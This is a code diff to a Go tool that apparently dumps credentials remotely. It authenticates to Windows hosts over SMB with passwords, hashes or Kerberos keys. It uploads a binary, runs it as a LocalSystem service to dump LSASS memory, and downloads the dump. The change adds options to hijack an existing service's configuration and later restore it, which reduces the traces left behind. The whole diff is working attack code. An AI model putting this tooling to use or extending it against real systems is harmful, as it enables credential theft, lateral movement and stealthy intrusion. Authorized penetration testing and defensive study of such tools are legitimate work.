@@ -23,6 +23,7 @@ package main
 
 import (
 	"encoding/hex"
+	"encoding/json"
 	"flag"
 	"fmt"
 	"os"
@@ -41,7 +42,7 @@ import (
 )
 
 var log = golog.Get("")
-var release string = "0.3.0"
+var release string = "0.3.1"
 var bind *dcerpc.ServiceBind
 var session *smb.Connection
 
@@ -55,46 +56,86 @@ func isFlagSet(name string) bool {
 	return found
 }
 
-func installService(serviceName, exePath string, args []string) error {
+func installService(serviceName, exePath string, args []string, modify bool, backupFile string) (created bool, err error) {
+	createService := true
 	if bind == nil {
-		err := fmt.Errorf("Must bind to the Service pipe first")
+		err = fmt.Errorf("Must bind to the Service pipe first")
 		log.Errorln(err)
-		return err
+		return
 	}
 	// If service already exists, abort
-	_, err := bind.GetServiceStatus(serviceName)
+	_, err = bind.GetServiceStatus(serviceName)
 	if err != nil {
 		if err != dcerpc.ServiceResponseCodeMap[dcerpc.ErrorServiceDoesNotExist] {
 			log.Errorln(err)
-			return err
+			return
 		}
 	} else {
 		// Service already exists
-		log.Errorf("Service %s already exists. If this is from an old deployment, "+
-			"run --cleanup to uninstall the service before trying again. "+
-			"Otherwise, choose another service name\n", serviceName)
-
-		return fmt.Errorf("Service already exists!")
+		if modify {
+			if backupFile == "" {
+				return false, fmt.Errorf("Service already exists and cannot modify config without a backup file")
+			}
+			f, err := os.OpenFile(backupFile, os.O_CREATE|os.O_TRUNC|os.O_RDWR, 0600)
+			if err != nil {
+				log.Errorln(err)
+				return false, fmt.Errorf("Service already exists and failed to open local backup file")
+			}
+			defer f.Close()
+			config, err := bind.GetServiceConfig(serviceName)
+			if err != nil {
+				log.Errorln(err)
+				return false, fmt.Errorf("Service already exists and failed to retrieve service config")
+			}
+			configBuf, err := json.Marshal(&config)
+			if err != nil {
+				log.Errorln(err)
+				return false, fmt.Errorf("Service already exists and failed to json encode the service config")
+			}
+			n, err := f.Write(configBuf)
+			if err != nil {
+				log.Errorln(err)
+				return false, fmt.Errorf("Service already exists and failed to backup service config to disk")
+			}
+			if n != len(configBuf) {
+				return false, fmt.Errorf("Service already exists and failed to backup the whole service config to disk")
+			}
+			createService = false
+		} else {
+			log.Errorf("Service %s already exists. If this is from an old deployment, "+
+				"run --cleanup to uninstall the service before trying again. "+
+				"Otherwise, choose another service name or use the --modify flag\n", serviceName)
+			return false, fmt.Errorf("Service already exists!")
+		}
 	}
 
-	// Create the service
-	err = bind.CreateService(serviceName, dcerpc.ServiceWin32OwnProcess, dcerpc.ServiceDemandStart, dcerpc.ServiceErrorIgnore, exePath, "LocalSystem", "", serviceName, false)
-	if err != nil {
-		log.Errorln(err)
-		return err
+	if createService {
+		// Create the service
+		err = bind.CreateService(serviceName, dcerpc.ServiceWin32OwnProcess, dcerpc.ServiceDemandStart, dcerpc.ServiceErrorIgnore, exePath, "LocalSystem", "", serviceName, false)
+		if err != nil {
+			log.Errorln(err)
+			return
+		}
+		created = true
+	} else {
+		err = bind.ChangeServiceConfig(serviceName, dcerpc.ServiceWin32OwnProcess, dcerpc.ServiceDemandStart, dcerpc.ServiceErrorIgnore, exePath, "LocalSystem", "", "")
+		if err != nil {
+			log.Errorln(err)
+			return
+		}
 	}
 
 	// Start service with arguments
 	err = bind.StartService(serviceName, args)
 	if err != nil {
 		log.Errorln(err)
-		return err
+		return
 	}
 
-	return nil
+	return
 }
 
-func cleanup(o smb.Options, serviceName, svcBinaryFullPath, dumpFilePath string) (err error) {
+func cleanup(o smb.Options, serviceName, svcBinaryFullPath, dumpFilePath string, deleteService bool, backupFile string) (err error) {
 	if session == nil {
 		// Assume a standalone cleanup run
 		session, err = smb.NewConnection(o)
@@ -128,18 +169,55 @@ func cleanup(o smb.Options, serviceName, svcBinaryFullPath, dumpFilePath string)
 		}
 	}
 
-	log.Infof("Trying to uninstall the %s service\n", serviceName)
-	err = bind.DeleteService(serviceName)
-	if err != nil {
-		log.Errorln(err)
+	if deleteService {
+		log.Infof("Trying to uninstall the %s service\n", serviceName)
+		err = bind.DeleteService(serviceName)
+		if err != nil {
+			log.Errorln(err)
+		} else {
+			log.Infof("Successfully uninstalled the %s service\n", serviceName)
+		}
 	} else {
-		log.Infof("Successfully uninstalled the %s service\n", serviceName)
+		log.Infof("Trying to restore config of the %s service\n", serviceName)
+		if backupFile == "" {
+			log.Errorf("Cannot restore service config if backup file is not specified")
+			return
+		}
+		var f *os.File
+		var n int
+		var config *dcerpc.ServiceConfig = &dcerpc.ServiceConfig{}
+		f, err = os.Open(backupFile)
+		if err != nil {
+			log.Errorln(err)
+			return
+		}
+		defer f.Close()
+		buf := make([]byte, 1024) // Arbitrarily large buffer to contain a full service config
+		n, err = f.Read(buf)
+		if err != nil {
+			log.Errorln(err)
+			return
+		}
+		if n == 0 {
+			return fmt.Errorf("Cannot restore service config if backup file is empty")
+		}
+		err = json.Unmarshal(buf[:n], config)
+		if err != nil {
+			log.Errorln(err)
+			return
+		}
+		err = bind.ChangeServiceConfig2(serviceName, config)
+		if err != nil {
+			log.Errorln(err)
+			return
+		}
+		log.Infof("Successfully restored the service config for %s\n", serviceName)
 	}
 
 	log.Infof("Trying to delete the %s service binary (%s)\n", serviceName, svcBinaryFullPath)
 	err = session.DeleteFile("C$", svcBinaryFullPath[3:])
 	if err != nil {
-		log.Errorln(err)
+		log.Errorf("Failed to delete the service binary with error: %v\n", err)
 	} else {
 		log.Infof("Successfully deleted the %s service binary\n", svcBinaryFullPath)
 	}
@@ -151,6 +229,8 @@ func cleanup(o smb.Options, serviceName, svcBinaryFullPath, dumpFilePath string)
 			log.Errorln(err)
 			return
 		}
+		err = nil
+		log.Infoln("Dump file did not exist")
 		// File did not exist so do nothing
 	} else {
 		log.Infof("Successfully deleted the dump file %s\n", dumpFilePath)
@@ -191,6 +271,10 @@ var helpMsg = `
           --dumpfile            Name of lsass dump file written to disk (default misc.log)
           --dumpdir             Remote path on C: to temporarily store the lsass dump (default C:\windows\)
           --output              Path to where to store the lsass dump locally (default lsass.dmp)
+          --modify              Will modify the service if it already exists. EXPERIMENTAL (default false)
+          --restore             Restores a modified service config when using --cleanup flag EXPERIMENTAL (default false)
+          --backup-file         File to store previous service config in or restore from
+                                when modifying an existing service (default svc-backup.json)
           --noenc               Disable smb encryption
           --smb2                Force smb 2.1
           --debug               Enable debug logging
@@ -199,9 +283,9 @@ var helpMsg = `
 `
 
 func main() {
-	var host, username, password, hash, domain, serviceName, dumper, svcBinaryName, svcBinaryPath, dumpFileName, dumpDir, outFile, socksIP, targetIP, dcIP, aesKey string
+	var host, username, password, hash, domain, serviceName, dumper, svcBinaryName, svcBinaryPath, dumpFileName, dumpDir, outFile, socksIP, targetIP, dcIP, aesKey, backupFile string
 	var port, dialTimeout, socksPort, relayPort int
-	var debug, noEnc, forceSMB2, localUser, version, runCleanup, verbose, relay, noPass, kerberos bool
+	var debug, noEnc, forceSMB2, localUser, version, runCleanup, verbose, relay, noPass, kerberos, modify, restoreServiceConfig bool
 	var err error
 	var hashBytes, aesKeyBytes []byte
 
@@ -248,6 +332,9 @@ func main() {
 	flag.StringVar(&targetIP, "target-ip", "", "")
 	flag.StringVar(&dcIP, "dc-ip", "", "")
 	flag.StringVar(&aesKey, "aes-key", "", "")
+	flag.BoolVar(&modify, "modify", false, "")
+	flag.StringVar(&backupFile, "backup-file", "svc-backup.json", "")
+	flag.BoolVar(&restoreServiceConfig, "restore", false, "")
 
 	flag.Parse()
 
@@ -473,7 +560,12 @@ func main() {
 	}
 
 	if runCleanup {
-		err = cleanup(options, serviceName, svcBinaryPath+svcBinaryName, dumpDir+dumpFileName)
+		deleteService := true
+		if restoreServiceConfig {
+			deleteService = false
+		}
+
+		err = cleanup(options, serviceName, svcBinaryPath+svcBinaryName, dumpDir+dumpFileName, deleteService, backupFile)
 		if err != nil {
 			log.Errorln(err)
 		}
@@ -501,7 +593,16 @@ func main() {
 	}
 	defer svcctl.CloseFile()
 
-	defer cleanup(options, serviceName, svcBinaryPath+svcBinaryName, dumpDir+dumpFileName)
+	/*
+	   NOTE
+	   Currently the go-smb library does not support modifying all the configuration attributes of a service
+	   As such, when using the --modify flag, a few configuration items are not restored such as
+	   Dependencies, LoadOrderGroup, and TagId
+	*/
+	createdNewService := true
+	defer func(deleteService *bool) {
+		cleanup(options, serviceName, svcBinaryPath+svcBinaryName, dumpDir+dumpFileName, *deleteService, backupFile)
+	}(&createdNewService)
 
 	err = session.PutFile("C$", svcBinaryPath[3:]+svcBinaryName, 0, f.Read)
 	if err != nil {
@@ -520,7 +621,7 @@ func main() {
 		return
 	}
 
-	err = installService(serviceName, svcBinaryPath+svcBinaryName, []string{"lsass.exe", dumpDir + dumpFileName})
+	createdNewService, err = installService(serviceName, svcBinaryPath+svcBinaryName, []string{"lsass.exe", dumpDir + dumpFileName}, modify, backupFile)
 	if err != nil {
 		log.Errorln(err)
 		return
